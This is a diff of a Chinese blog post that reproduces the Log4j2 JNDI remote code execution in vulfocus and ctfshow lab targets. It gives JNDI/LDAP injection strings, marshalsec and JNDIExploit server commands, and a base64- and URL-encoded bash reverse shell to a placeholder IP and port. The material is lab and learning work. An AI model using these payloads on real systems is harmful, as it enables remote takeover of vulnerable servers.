@@ -581,14 +581,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    437
+                    622
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -611,15 +611,17 @@
 <p>先上个链接<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649">Apache Log4j2从RCE到RC1绕过</a></p>
 <h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>详细见**<a target="_blank" rel="noopener" href="https://github.com/KagamigawaMeguri/apache-log4j-rce-poc"> apache-log4j-rce-poc</a>**</p>
 <h2 id="远程复现"><a href="#远程复现" class="headerlink" title="远程复现"></a>远程复现</h2><p><strong>环境</strong>1</p>
-<p>经测试暂时无法RCE</p>
+<p>这个环境需要用rmi</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker run -d -P vulfocus&#x2F;log4j2-rce-2021-12-09:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">POST &#x2F;hello HTTP&#x2F;1.1 Host: 127.0.0.1:55000 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 39 payload&#x3D;xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211133148080.png"></p>
 <p><strong>环境2</strong></p>
-<p>ctfshow</p>
-<h3 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h3><p><code>$&#123;jndi:ldap://ip/a&#125;</code>触发漏洞访问<code>ldap</code>-&gt;<code>ldap</code>访问<code>http server</code>获取<code>evil.class</code>-&gt;上传<code>evil.class</code>并执行</p>
+<p>ctfshow或其他靶机，一般使用ldap</p>
+<h3 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h3><blockquote>
+<p>仅测试了本地和ctfshow的靶机</p>
+</blockquote>
+<p><code>$&#123;jndi:ldap://ip/a&#125;</code>触发漏洞访问<code>ldap</code>-&gt;<code>ldap</code>访问<code>http server</code>获取<code>evil.class</code>-&gt;上传<code>evil.class</code>并执行</p>
 <p>1.编译java文件并启动http server</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jRCE</span> <span class="token punctuation">&#123;</span>
 
@@ -666,6 +668,35 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 </blockquote>
 <p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211170346324.png"></p>
 <p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211150557399.png"></p>
+<ul>
+<li><p>vulfocus</p>
+<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211204918179.png"></p>
+</li>
+<li><p>一般环境</p>
+<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211204951640.png"></p>
+</li>
+</ul>
+<h3 id="JNDIExploit"><a href="#JNDIExploit" class="headerlink" title="JNDIExploit"></a>JNDIExploit</h3><blockquote>
+<p>注意：以下操作用于vulfocus的靶机，其他环境请举一反三。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a>更好使！能看到command执行情况，不然都发现不了问题。</p>
+<p>先<strong>base64编码</strong>，然后将里面的+号进行<strong>两次url编码</strong>(hackbar与bp需要)</p>
+<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211202943765.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1
+# &#x3D;&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE&#x3D;
+# &#x3D;&gt; YmFzaCAtaSA%252BJiAvZGV2L3RjcC9JUC9QT1JUIDA%252BJjE%253D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>然后启动<code>JNDIExploit</code></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDIExploit.jar -i ip -l 1389 -p 8180<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC9JUC9QT1JUIDA%252BJjE%253D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果不处理<code>+</code>，打进去的命令就会变成：</p>
+<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211202615888.png"></p>
+<h2 id="QA"><a href="#QA" class="headerlink" title="QA"></a>QA</h2><p>弹shell报：</p>
+<p><code>nc: getnameinfo: Temporary failure in name resolution</code></p>
+<p>尝试用<code>nc -lvnp port</code></p>
 
                 
             </div>
